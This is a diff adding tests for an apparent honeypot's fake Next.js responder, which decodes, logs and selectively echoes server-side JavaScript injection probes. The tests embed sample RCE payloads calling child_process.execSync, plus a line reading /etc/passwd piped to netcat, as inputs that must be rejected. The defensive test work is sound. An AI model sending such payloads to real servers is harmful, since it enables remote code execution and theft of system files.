@@ -389,6 +389,7 @@ def test_all_trap_families_default_on():
     assert tbenv.GEOSERVER_ENABLED
     assert tbenv.COLDFUSION_ENABLED
     assert tbenv.CONFLUENCE_ENABLED
+    assert tbenv.NEXTJS_ENABLED
     assert tbenv.CMD_INJECTION_ENABLED
 
 
@@ -3252,6 +3253,216 @@ async def test_dispatch_confluence_disabled_returns_404(flux_client, monkeypatch
     resp = await flux_client.get(
         "/pages/createpage-entervariables.action",
         headers={"X-Forwarded-For": "203.0.113.76"},
+    )
+    assert resp.status == 404
+    entries = _log_entries(flux_client.log_path)
+    assert entries[-1]["result"] == "not-handled"
+
+
+# --- Fake Next.js SSJS-injection probe responder ---
+
+
+def test_nextjs_enabled_by_default():
+    assert tbenv.NEXTJS_ENABLED
+
+
+def test_nextjs_default_paths_cover_observed_probes():
+    for path in (
+        "/api/endpoint",
+        "/api/test",
+        "/api/[[...slug]]",
+        "/_next/data/abc123/page.json",
+        "/_next/data/abc123/index.json",
+        "/_next/data/abc123/home.json",
+        "/_next/static/chunks/pages/index-deadbeef.js",
+        "/api/v2/about",   # Next.js API catch-all + matches Ubiquiti UniFi probes too
+    ):
+        assert tbenv.is_nextjs_path(path), f"expected match: {path}"
+
+
+def test_nextjs_path_non_match():
+    for path in (
+        "/",
+        "/index.html",
+        "/.env",
+        "/wp-login.php",
+        # `/static/` without `_next/` prefix is generic, not Next.js.
+        "/static/main.js",
+    ):
+        assert not tbenv.is_nextjs_path(path), f"unexpected match: {path}"
+
+
+def test_nextjs_disabled_returns_false(monkeypatch):
+    monkeypatch.setattr(tbenv, "NEXTJS_ENABLED", False)
+    assert not tbenv.is_nextjs_path("/_next/data/abc/page.json")
+    assert not tbenv.is_nextjs_path("/api/endpoint")
+
+
+def test_nextjs_decode_cmd_param_base64():
+    payload = (
+        "(function(){try{var cmd=\"echo VULN_TEST\";"
+        "var r=require('child_process').execSync(cmd).toString();"
+        "return r;}catch(e){return 'ERROR';}})()"
+    )
+    encoded = base64.b64encode(payload.encode()).decode()
+    decoded = tbenv._nextjs_decode_cmd_param(f"cmd={encoded}")
+    assert "var cmd=\"echo VULN_TEST\"" in decoded
+    assert "child_process" in decoded
+
+
+def test_nextjs_decode_cmd_param_url_safe_base64_no_padding():
+    payload = "var cmd = 'echo HELLO'; require('child_process')"
+    raw = base64.urlsafe_b64encode(payload.encode()).decode().rstrip("=")
+    decoded = tbenv._nextjs_decode_cmd_param(f"cmd={raw}")
+    assert "echo HELLO" in decoded
+
+
+def test_nextjs_decode_cmd_param_falls_back_to_plaintext():
+    # Plain `?cmd=id` (not base64) — return as-is so it still gets logged.
+    decoded = tbenv._nextjs_decode_cmd_param("cmd=id")
+    assert decoded.strip() in {"id", base64.b64decode("id==", validate=False).decode("utf-8", errors="replace")}
+
+
+def test_nextjs_decode_cmd_param_absent():
+    assert tbenv._nextjs_decode_cmd_param("") == ""
+    assert tbenv._nextjs_decode_cmd_param("foo=bar") == ""
+
+
+def test_nextjs_has_ssjs():
+    assert tbenv._nextjs_has_ssjs(
+        "(function(){var r = require('child_process').execSync('id');})()",
+    )
+    # The `child-process` (with hyphen) form observed in real probes —
+    # not a real Node module but still a probe fingerprint.
+    assert tbenv._nextjs_has_ssjs("require('child-process')")
+    assert not tbenv._nextjs_has_ssjs("")
+    assert not tbenv._nextjs_has_ssjs("plain text, no js eval here")
+
+
+def test_nextjs_extract_cmd_literal():
+    payload = (
+        "(function(){try{var cmd = \"echo VULN_TEST\";"
+        "var r=require('child_process').execSync(cmd);}})()"
+    )
+    assert tbenv._nextjs_extract_cmd_literal(payload) == "echo VULN_TEST"
+    # Single quotes also supported.
+    assert tbenv._nextjs_extract_cmd_literal("var cmd = 'id'") == "id"
+    assert tbenv._nextjs_extract_cmd_literal("no cmd here") == ""
+
+
+def test_nextjs_simulate_command_echo_token():
+    assert tbenv._nextjs_simulate_command("echo VULN_TEST") == "VULN_TEST\n"
+    assert tbenv._nextjs_simulate_command("echo \"hello world\"") == "hello world\n"
+
+
+def test_nextjs_simulate_command_unsafe_falls_back_to_error():
+    # Anything other than a literal echo of a printable-ASCII token
+    # falls back to the scanner's own catch-block sentinel.
+    assert tbenv._nextjs_simulate_command("id") == "ERROR"
+    assert tbenv._nextjs_simulate_command("cat /etc/passwd | nc x y") == "ERROR"
+    assert tbenv._nextjs_simulate_command("") == "ERROR"
+    # Non-printable / shell-meta should not be reflected even after `echo `.
+    assert tbenv._nextjs_simulate_command("echo $(id)") == "ERROR"
+    assert tbenv._nextjs_simulate_command("echo `id`") == "ERROR"
+
+
+def test_render_nextjs_page_data_shape():
+    payload = json.loads(tbenv.render_nextjs_page_data("/_next/data/abc/page.json"))
+    assert "pageProps" in payload
+    assert payload.get("__N_SSG") is True
+
+
+def test_render_nextjs_static_chunk_shape():
+    body = tbenv.render_nextjs_static_chunk()
+    assert b"webpackChunk" in body
+
+
+async def test_dispatch_nextjs_data_route_returns_pageprops_json(flux_client):
+    resp = await flux_client.get(
+        "/_next/data/buildId123/index.json",
+        headers={"X-Forwarded-For": "203.0.113.81"},
+    )
+    assert resp.status == 200
+    payload = await resp.json()
+    assert "pageProps" in payload
+    assert resp.headers.get("X-Powered-By") == "Next.js"
+
+    entry = _log_entries(flux_client.log_path)[-1]
+    assert entry["result"] == "nextjs-page-data"
+    assert entry["nextjsHasSsjs"] is False
+
+
+async def test_dispatch_nextjs_ssjs_probe_reflects_echo_simulation(flux_client):
+    # The exact payload shape observed in the wild.
+    payload = (
+        "(function(){\n"
+        "    try {\n"
+        "        var cmd = \"echo VULN_TEST\";\n"
+        "        var result = require('child-process').execSync(cmd).toString();\n"
+        "        return result;\n"
+        "    } catch (err) {\n"
+        "        return 'ERROR';\n"
+        "    }\n"
+        "})()"
+    )
+    encoded = base64.b64encode(payload.encode()).decode()
+    resp = await flux_client.get(
+        f"/api/endpoint?cmd={encoded}",
+        headers={"X-Forwarded-For": "203.0.113.82"},
+    )
+    assert resp.status == 200
+    text = await resp.text()
+    # Reflecting the `echo VULN_TEST` literal back is what makes the
+    # scanner believe it has a working SSJS RCE — invites a follow-up
+    # exploitation payload that we capture in the next request.
+    assert text == "VULN_TEST\n"
+
+    entry = _log_entries(flux_client.log_path)[-1]
+    assert entry["result"] == "nextjs-ssjs-probe"
+    assert entry["nextjsHasSsjs"] is True
+    assert entry["nextjsCmdLiteral"] == "echo VULN_TEST"
+    assert "child-process" in entry["nextjsCmdDecoded"]
+
+
+async def test_dispatch_nextjs_ssjs_unrecognised_cmd_returns_error_sentinel(flux_client):
+    payload = (
+        "(function(){var cmd=\"id\";"
+        "require('child_process').execSync(cmd);})()"
+    )
+    encoded = base64.b64encode(payload.encode()).decode()
+    resp = await flux_client.get(
+        f"/_next/data/buildId/page.json?cmd={encoded}",
+        headers={"X-Forwarded-For": "203.0.113.83"},
+    )
+    assert resp.status == 200
+    text = await resp.text()
+    # Anything other than a literal `echo <safe>` falls back to the
+    # scanner's own catch-block sentinel — tells the scanner SSJS
+    # evaluation works but the require failed.
+    assert text == "ERROR"
+
+    entry = _log_entries(flux_client.log_path)[-1]
+    assert entry["result"] == "nextjs-ssjs-probe"
+    assert entry["nextjsCmdLiteral"] == "id"
+
+
+async def test_dispatch_nextjs_static_chunk_returns_js(flux_client):
+    resp = await flux_client.get(
+        "/_next/static/chunks/pages/index-1234.js",
+        headers={"X-Forwarded-For": "203.0.113.84"},
+    )
+    assert resp.status == 200
+    body = await resp.text()
+    assert "webpackChunk" in body
+    entry = _log_entries(flux_client.log_path)[-1]
+    assert entry["result"] == "nextjs-static-chunk"
+
+
+async def test_dispatch_nextjs_disabled_returns_404(flux_client, monkeypatch):
+    monkeypatch.setattr(tbenv, "NEXTJS_ENABLED", False)
+    resp = await flux_client.get(
+        "/_next/data/buildId/page.json",
+        headers={"X-Forwarded-For": "203.0.113.85"},
     )
     assert resp.status == 404
     entries = _log_entries(flux_client.log_path)
